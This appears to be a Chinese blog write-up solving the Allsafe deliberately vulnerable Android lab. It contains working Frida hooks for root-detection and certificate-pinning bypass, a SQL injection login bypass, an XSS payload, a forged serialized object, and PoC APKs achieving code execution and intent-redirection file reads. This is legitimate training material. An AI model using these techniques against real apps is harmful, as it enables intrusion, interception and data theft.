---
stats_id: allsafe-android-writeup
title: "allsafe wp"
date: 2025-09-14 15:53:34
updated: 2025-09-14 15:53:34
categories:
  - "Android"
tags:
  - "Android"
  - "靶场"
  - "Allsafe"
  - "Frida"
  - "漏洞分析"
excerpt: "Allsafe 安卓靶场题解，涵盖日志、组件、WebView、存储、证书校验等安全问题。"
source_date_basis: file-mtime
---
## Insecure Logging

> 题目描述：Simple information disclosure vulnerability. Use the `logcat` command-line tool to discover sensitive information.

logcat看一下就能看到用户输入了

```shell
adb shell 'pidof infosecadventures.allsafe'
adb shell 'logcat --pid pid | grep secret'
```

![](/media/posts/allsafe-android-writeup/995a3c914fe9b35d.png)



## Hardcoded Credentials

> 题目描述：Some credentials are left in the code. Your task is to reverse engineer the app and find sensitive information.

点进题目一直显示under development，反编译查看HardcodedCredentials类，发现BODY中硬编码了账密，则答案为**superadmin:supersecurepassword**

![](/media/posts/allsafe-android-writeup/6fd0f578f06757e4.png)



## Root Detection

>题目描述：This is purely for Frida practice. Make the code believe that your device is not rooted!

反编译代码，发现调用RootBeer.isRooted方法来查看是否root，直接frida hook返回值就行

![](/media/posts/allsafe-android-writeup/96d76ad15b33aa12.png)

```js
//frida -U -f infosecadventures.allsafe -l hook.js
Java.perform(function () {
    var RootBeer = Java.use("com.scottyab.rootbeer.RootBeer");

    RootBeer.isRooted.implementation = function () {
        console.log("Bypassed RootBeer.isRooted()");
        return false;
    };
});
```

这个界面还不能截屏只能拍个照了（）

<img src="/media/posts/allsafe-android-writeup/798af14502f55ee9.png" style="zoom: 67%;" />



## Secure Flag Bypass

> 题目描述：Another Frida-based task. No real vulnerability here, just have fun bypassing the secure flag!

蚌埠住了前面刚说截不了屏现在就来了

题目提示说在MainActivity有禁止截图，查看main代码，发现**this.getWindow().setFlags(0x2000, 0x2000);**通过设置flag禁用了截屏，具体参考https://developer.android.com/security/fraud-prevention/activities?hl=zh-cn#kotlin

![](/media/posts/allsafe-android-writeup/3be7e5301d21e3a4.png)

那就把参数的这一位hook掉就行

```js
//frida -U -f infosecadventures.allsafe -l hook.js
Java.perform(function () {
    var Window = Java.use("android.view.Window");
    Window.setFlags.implementation = function (flags, mask) {
        console.log("Original flags: " + flags + ", mask: " + mask);
        var newFlags = flags&(~0x2000);
        var newMask = mask&(~0x2000);
        console.log("Modified flags: " + newFlags + ", mask: " + newMask);
        return this.setFlags(newFlags, newMask);
    };
});
```

成功截图

<img src="/media/posts/allsafe-android-writeup/64933290d0965f09.png" style="zoom:67%;" />



## PIN Bypass

> 题目描述：As you can see, there's a simple PIN code validation below. Locate the method in the code and use Frida to override the return value. You can even brute-force the code because it's only 4 digit.

jeb直接都把base64解了，密码即为4863

![](/media/posts/allsafe-android-writeup/b70b829cd417e827.png)



## Deep Link Exploitation

> 题目描述：Similar to the insecure broadcast receiver, you need to provide the right query parameter to complete this task!

获取了启动deeplink的intent的url中的key参数，只要key等于ebfb7ff0-b2f6-41c8-bef3-4fba17be410c就行

![](/media/posts/allsafe-android-writeup/035e96423f76fc5f.png)

查看manifest文件，看到DeepLinkTask定义了两个intent filter，可以通过scheme uri “allsafe://infosecadventures/congrats”或者https启动

![](/media/posts/allsafe-android-writeup/4690652e074765e2.png)

这里使用scheme uri启动activity

```shell
adb shell am start -a android.intent.action.VIEW -d "allsafe://infosecadventures/congrats?key=ebfb7ff0-b2f6-41c8-bef3-4fba17be410c"
```

成功调用

<img src="/media/posts/allsafe-android-writeup/1bef70d0dfe95028.png" style="zoom: 25%;" />

## Weak Cryptography

> 题目描述：hook加密过程中的方法

以md5为例，aes加密和随机数同理

```js
Java.perform(function () {
    var Window = Java.use("infosecadventures.allsafe.challenges.WeakCryptography");
    Window.md5Hash.implementation = function (arg0) {
        console.log("input string: " + arg0);
        return "md5md5";
    };
});
```



## Vulnerable WebView

> 题目描述：You can also complete this task without decompiling the application. Pop an alert dialog and read files!

存在xss注入

```
<script>alert("12345")<\script>
```

<img src="/media/posts/allsafe-android-writeup/da63bee14177207b.png" style="zoom: 25%;" />

对路径也没有过滤，可以直接访问文件

```
file:///etc/hosts
```



<img src="/media/posts/allsafe-android-writeup/361c18cf788679f3.png" style="zoom: 25%;" />



## Native Library

> 题目描述：The application uses a native library that validates the entered password. Reverse engineer the library to find the password then use Frida to hook the native method.

看java层发现是调用了native的函数

![](/media/posts/allsafe-android-writeup/53be6695d7802ec0.png)

跟进native层，发现异或加密和密文，解密出来就是”supersecret“，甚至直接就没删

![](/media/posts/allsafe-android-writeup/457709224581421e.png)

![](/media/posts/allsafe-android-writeup/2803cbc2eb75adbd.png)



## Object Serialization

> 题目描述：It is often convenient to serialize objects for convenient communication or to save them for later use. I heard that there's an object deserialization vulnerability somewhere combined with insecure data storage.

save user data时，将username和password序列化存在了文件中，存在反序列化漏洞

![](/media/posts/allsafe-android-writeup/eddaa25c56944013.png)

load user data时，先判断role字段是否为"ROLE_EDITOR"，但输入的时候并未设置该字段，所以失败。因此我们可以自己构造带有role字段的序列化对象上传到对应的文件夹中实现绕过

![](/media/posts/allsafe-android-writeup/ece896b77490a87e.png)

首先获取序列化对象所在目录

```js
Java.perform(function () {
    var ContextWrapper = Java.use("android.content.ContextWrapper");

    ContextWrapper.getExternalFilesDir.overload('java.lang.String').implementation = function (type) {
        var result = this.getExternalFilesDir(type);
        console.log("[+] getExternalFilesDir called, result: " + result);
        return result;
    };
});
```

可以看到目录位于/storage/emulated/0/Android/data/infosecadventures.allsafe/files

![](/media/posts/allsafe-android-writeup/969ce9dd14117526.png)

接下来构造序列化对象

```java
package infosecadventures.allsafe.challenges;

import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;

public class ObjectSerialization {
    public static void main(String[] args) {
        try {
            User user = new User("admin", "admin123");
            user.role = "ROLE_EDITOR";  // 修改角色为有权限的角色

            FileOutputStream fos = new FileOutputStream("user.dat");
            ObjectOutputStream oos = new ObjectOutputStream(fos);
            oos.writeObject(user);
            oos.close();
            fos.close();

            System.out.println("✅ user.dat 序列化完成。");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static class User implements Serializable {
        private static final long serialVersionUID = -4886601626931750812L; //序列化版本要一致，报错信息可以看到

        public String username;
        public String password;
        public String role;

        public User(String username, String password) {
            this.username = username;
            this.password = password;
            this.role = "ROLE_AUTHOR";  // 默认角色
        }

        @Override
        public String toString() {
            return "User{username='" + username + "', password='" + password + "', role='" + role + "'}";
        }
    }
}

```

```shell
#在项目根目录运行
javac -d out infosecadventures/allsafe/challenges/ObjectSerialization.java
cd out
java infosecadventures.allsafe.challenges.ObjectSerialization
```

将生成的user.dat上传到文件夹即可读取

<img src="/media/posts/allsafe-android-writeup/6ca0a62c5fb7549f.png" style="zoom: 50%;" />



## Insecure Shared Preferences

> 题目描述：Shared preferences are, by default, stored within the app's data directory with filesystem permissions set that only allow the UID that specific application runs with to access them. Also, if someone was able to mount your device's filesystem without using the installed Android OS, they could also bypass the permissions that restrict access.

查看shared preferencesa部分的代码，发现是直接明文存储的，即使是存在私有目录下也是危险的做法

![](/media/posts/allsafe-android-writeup/dfba201af6018442.png)

直接root连上去读取就能读取出账密

![](/media/posts/allsafe-android-writeup/5f78e6734dcc79f1.png)



## Insecure Service

> 题目描述：The application needs the RECORD_AUDIO permission for some reason. Find out why the app needs this and write a simple app to mis-use the functionality on this fragment

逆向发现该类申请了录音权限来输出录音音频到download文件夹，而且使用的RecordService服务是被导出了的，这样RecordService服务可以被任意apk使用

![](/media/posts/allsafe-android-writeup/a029ad035122965c.png)

adb调用一下成功获取服务

![](/media/posts/allsafe-android-writeup/c9e8e2a765b58b59.png)



## Insecure Broadcast Receiver

> 题目描述：our intern wrote a simple note tasking feature into the app but the data processing logic seems weird. Gideon got some reports about critical vulnerabilities being exploited... As far as I know, hackers were able to capture the notes and exploit a permission re-delegation vulnerability. Can you check this madness out and maybe write a PoC for demonstration

该功能向系统中所有声明了 `infosecadventures.allsafe.action.PROCESS_NOTE` 的BroadcastReceiver广播敏感信息，只要监听这个action就能拦截广播

![](/media/posts/allsafe-android-writeup/bb2cb81c72bd7910.png)

写一个监听器

```kotlin
package com.example.maliciousreceiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log
import android.widget.Toast

class MaliciousReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent?) {
        if (intent?.action == "infosecadventures.allsafe.action.PROCESS_NOTE") {
            val note = intent.getStringExtra("note")
            val server = intent.getStringExtra("server")
            val notification = intent.getStringExtra("notification_message")

            Log.i("MaliciousReceiver", "Note: $note")
            Log.i("MaliciousReceiver", "Server: $server")
            Log.i("MaliciousReceiver", "Notification Message: $notification")

            Toast.makeText(context, "Intercepted note: $note", Toast.LENGTH_LONG).show()
        }
    }
}
```

成功拦截到广播内容

![](/media/posts/allsafe-android-writeup/b2c644406a00a995.png)



## Firebase Database

> 题目描述：In this task, the application is getting data from a realtime database. It's all nice and good but I have a feeling the developers didn't set the correct rules for production.

查看反编译代码，发现用的是firebase数据库，且有一个secret节点

![](/media/posts/allsafe-android-writeup/03ecfc44ea266f2c.png)

搜索firebase获得数据库url：https://allsafe-8cef0.firebaseio.com

![](/media/posts/allsafe-android-writeup/dc9f6e933949d429.png)

访问url即可获得secret

![](/media/posts/allsafe-android-writeup/29c0b32618fc2976.png)



## Certificate Pinning

> 题目描述：In this challenge, your task is to intercept the traffic and bypass the certificate pinning. The implementation is fairly good, so you might have to use Frida or patch the APK.

这里用certificatePinner绑定了固定的证书，所以无法抓包

![](/media/posts/allsafe-android-writeup/4589091450d3e285.png)

使用网上的frida代码，思路为创建一个包含自己的可信根证书的 KeyStore，然后构造一个新的 TrustManager，只信任这个 KeyStore，最后 hook `SSLContext.init(...)`，当 App 初始化 SSL 时，把原本的 TrustManager替换成抓包软件的CA，就可以抓包了。

```js
setTimeout(function() {
	Java.perform(function() {
		console.log("");
		console.log("[.] Cert Pinning Bypass/Re-Pinning");
		var CertificateFactory = Java.use("java.security.cert.CertificateFactory");
		var FileInputStream = Java.use("java.io.FileInputStream");
		var BufferedInputStream = Java.use("java.io.BufferedInputStream");
		var X509Certificate = Java.use("java.security.cert.X509Certificate");
		var KeyStore = Java.use("java.security.KeyStore");
		var TrustManagerFactory = Java.use("javax.net.ssl.TrustManagerFactory");
		var SSLContext = Java.use("javax.net.ssl.SSLContext");
		// Load CAs from an InputStream
        console.log("[+] Loading our CA...");
        var cf = CertificateFactory.getInstance("X.509");
		try {
			var fileInputStream = FileInputStream.$new("/data/local/tmp/10fb1fcc.0");   //替换成抓包软件的证书路径
		} catch(err) {
			console.log("[o] " + err);
		}
		var bufferedInputStream = BufferedInputStream.$new(fileInputStream);
		var ca = cf.generateCertificate(bufferedInputStream);
		bufferedInputStream.close();
		var certInfo = Java.cast(ca, X509Certificate);
		console.log("[o] Our CA Info: " + certInfo.getSubjectDN());
		// Create a KeyStore containing our trusted CAs
		console.log("[+] Creating a KeyStore for our CA...");
		var keyStoreType = KeyStore.getDefaultType();
		var keyStore = KeyStore.getInstance(keyStoreType);
		keyStore.load(null, null);
		keyStore.setCertificateEntry("ca", ca);
		// Create a TrustManager that trusts the CAs in our KeyStore
		console.log("[+] Creating a TrustManager that trusts the CA in our KeyStore...");
		var tmfAlgorithm = TrustManagerFactory.getDefaultAlgorithm();
		var tmf = TrustManagerFactory.getInstance(tmfAlgorithm);
		tmf.init(keyStore);
		console.log("[+] Our TrustManager is ready...");
        console.log("[+] Hijacking SSLContext methods now...");
        console.log("[-] Waiting for the app to invoke SSLContext.init()...");
        SSLContext.init.overload("[Ljavax.net.ssl.KeyManager;", "[Ljavax.net.ssl.TrustManager;", "java.security.SecureRandom").implementation = function (a, b, c) {
			console.log("[o] App invoked javax.net.ssl.SSLContext.init...");
			SSLContext.init.overload("[Ljavax.net.ssl.KeyManager;", "[Ljavax.net.ssl.TrustManager;", "java.security.SecureRandom").call(this, a, tmf.getTrustManagers(), c);
			console.log("[+] SSLContext initialized with our custom TrustManager!");
		}
	});
},
0);
```

可以看到hook后成功抓包

![](/media/posts/allsafe-android-writeup/210fa6352e81218a.png)



## Arbitrary Code Execution

> 题目描述：Loading modules securely with third-party apps are not easy. Write a PoC application and exploit the vulnerability!

ArbitraryCodeExecution类创建时调用了invokePlugins()和invokeUpdate()方法

![](/media/posts/allsafe-android-writeup/1629afbb43e884fe.png)

这两个方法都存在任意代码执行漏洞。

invokePlugins先在已安装的应用里找到包名以infosecadventures.allsafe开头的应用，然后调用了infosecadventures.allsafe.plugin.Loader类的loadPlugin方法。如果我们构造一个infosecadventures.allsafe开头的apk，然后就可以在infosecadventures.allsafe.plugin.Loader.loadPlugin执行我们想要执行的任意代码了。

invokeUpdate读取了Environment.DIRECTORY_DOWNLOADS目录（注意这是一个写死的字符串"Download"，所以绝对路径是**/data/data/infosecadventures.allsafe/files/Download/**）下的allsafe_updater.apk，然后调用了infosecadventures.allsafe.updater.VersionCheck类的getLatestVersion方法。我们只需要构造一个包名为infosecadventures.allsafe.updater的apk，然后在VersionCheck.getLatestVersion()中执行我们想要执行的任意代码即可。

```kotlin
public final class ArbitraryCodeExecution extends Application {
    private final void invokePlugins() {
        for(Object object0: this.getPackageManager().getInstalledPackages(0)) {
            String s = ((PackageInfo)object0).packageName;
            Intrinsics.checkNotNullExpressionValue(s, "packageInfo.packageName");
            if(!StringsKt.startsWith$default(s, "infosecadventures.allsafe", false, 2, null)) {
                continue;
            }

            try {
                Context context0 = this.createPackageContext(s, 3);
                Intrinsics.checkNotNullExpressionValue(context0, "packageContext");
                context0.getClassLoader().loadClass("infosecadventures.allsafe.plugin.Loader").getMethod("loadPlugin").invoke(null);
            }
            catch(Exception exception0) {
            }
        }
    }

    private final void invokeUpdate() {
        try {
            File file = new File(Environment.DIRECTORY_DOWNLOADS + "/allsafe_updater.apk");
            if((file.exists()) && (file.isFile())) {
                String s = file.getAbsolutePath();
                File file1 = this.getCacheDir();
                Intrinsics.checkNotNullExpressionValue(file1, "cacheDir");
                Object object0 = new DexClassLoader(s, file1.getAbsolutePath(), null, this.getClassLoader()).loadClass("infosecadventures.allsafe.updater.VersionCheck").getDeclaredMethod("getLatestVersion").invoke(null);
                if(object0 == null) {
                    throw new NullPointerException("null cannot be cast to non-null type kotlin.Int");
                }

                if(Build.VERSION.SDK_INT < ((int)(((Integer)object0)))) {
                    Toast.makeText(this, "Update required!", 1).show();
                    return;
                }
            }
        }
        catch(Exception exception0) {
        }
    }
```

invokePlugins利用exp如下：

```kotlin
package infosecadventures.allsafe.plugin

import android.util.Log
import java.io.BufferedReader
import java.io.InputStreamReader

object Loader {
    @JvmStatic
    fun loadPlugin() {
        try {
            val process = Runtime.getRuntime().exec("id")

            val reader = BufferedReader(InputStreamReader(process.inputStream))
            val output = reader.readText()
            Log.d("PluginLoader", "Command Output: $output")

        } catch (e: Exception) {
            Log.e("PluginLoader", "Error executing payload", e)
        }
    }
}

```

结果如下：

![](/media/posts/allsafe-android-writeup/02b87fa731e7369e.png)

invokeUpdate利用过程如下：

构造恶意apk，功能为执行"id"指令

```kotlin
package infosecadventures.allsafe.updater

import android.util.Log
import java.io.BufferedReader
import java.io.InputStreamReader

object VersionCheck {
    @JvmStatic
    fun getLatestVersion(): Int {
        try {
            val process = Runtime.getRuntime().exec("id")
            val reader = BufferedReader(InputStreamReader(process.inputStream))
            val output = reader.readText()
            Log.d("UpdaterPayload", "Command Output: $output")

        } catch (e: Exception) {
            Log.e("UpdaterPayload", "Error executing payload", e)
        }

        return 1
    }
}

```

上传文件到Download目录

```shell
adb push app-release.apk /data/local/tmp/allsafe_updater.apk
adb shell
su
mkdir /data/data/infosecadventures.allsafe/files/Download
mv /data/local/tmp/allsafe_updater.apk /data/data/infosecadventures.allsafe/files/Download/allsafe_updater.apk
```

运行allsafe apk，成功命令执行（这里需要等一段时间不知道为什么）

![](/media/posts/allsafe-android-writeup/b3bb8cd47b0ce194.png)



## Smali Patch

> 题目描述：Allsafe hired a new Android developer who made a beginner mistake setting up the firewall. Can you modify the decompiled Smali code in a way that the firewall is active by default?

发现条件为Firewall.INACTIVE.equals(Firewall.ACTIVE)，永远为假，则将smali代码的if-eqz patch成if-nez即可

![](/media/posts/allsafe-android-writeup/14e17627d136e5c0.png)

patch完之后成功启动

<img src="/media/posts/allsafe-android-writeup/f5814e42306163be.png" style="zoom: 40%;" />



## SQL Injection

> 题目描述：This task can be easily completed without reverse engineering the app. The goal is to bypass the following login page by exploiting a simple SQL injection vulnerability.

简单的sql注入

```sql
1' or 1=1 --
```

<img src="/media/posts/allsafe-android-writeup/0aeccb7074af238a.png" style="zoom: 50%;" />



## Insecure Providers

> 题目描述：We got a report that our notes database leaked through an insecure content provider. Fortunately, the dev team said it's easy to secure Android inter process communication. The app also provides access to some files which we share with other apps...
>
> Can you check if the implementation is good enough? Allsafe can't afford another sensitive file leak.

该类从数据库下载了一个readme.txt到本地

![](/media/posts/allsafe-android-writeup/ab61298591184ad4.png)

根据题目描述，他们修复了不安全的provider，可能是要我们利用provider来查看文件内容。查看manifest.xml文件，总共有两个provider

![](/media/posts/allsafe-android-writeup/c4b5c58b3c171841.png)

导出的只有dataprovider，fileprovider没有被导出不能直接外部调用。查看dataprovider代码，只注册了note一个节点，而且访问的路径也不是readme.txt的路径，无法利用

![](/media/posts/allsafe-android-writeup/b9c4b7cff1556dc5.png)

我们只能寻找其他导出的Activity/Services看看能不能利用，留意到ProxyActivity，它接受一个名为extra_intent的Intent对象并直接使用、`startActivity(extra_intent)`启动我们传入的 intent。那我们就可以利用ProxyActivity启动FileProvider来读取任意文件

![](/media/posts/allsafe-android-writeup/3e32656c40b7cfef.png)

![](/media/posts/allsafe-android-writeup/670473535af35249.png)

exp如下：

```kotlin
package com.example.provider

import android.content.ComponentName
import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.util.Log
import androidx.activity.ComponentActivity

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val targetUri = Uri.parse("content://infosecadventures.allsafe.fileprovider/files/docs/readme.txt")

        // Intent to view the readme file
        val readIntent = Intent(Intent.ACTION_VIEW).apply {
            setDataAndType(targetUri, "text/plain")
            flags = Intent.FLAG_GRANT_READ_URI_PERMISSION
        }

        // Proxy intent to be passed to ProxyActivity
        val proxyIntent = Intent().apply {
            component = ComponentName(
                "infosecadventures.allsafe",
                "infosecadventures.allsafe.ProxyActivity"
            )
            putExtra("extra_intent", readIntent)
        }

        try {
            startActivity(proxyIntent)
            Log.d("Exploit", "Proxy intent sent!")
        } catch (e: Exception) {
            Log.e("Exploit", "Failed to launch intent: ${e.message}")
        }

        finish()
    }
}

```

成功读取文件内容

<img src="/media/posts/allsafe-android-writeup/a8ac65b0bcba89c5.png" style="zoom: 33%;" />

解两次base64获得内容

![](/media/posts/allsafe-android-writeup/d0adad9240e7fbeb.png)
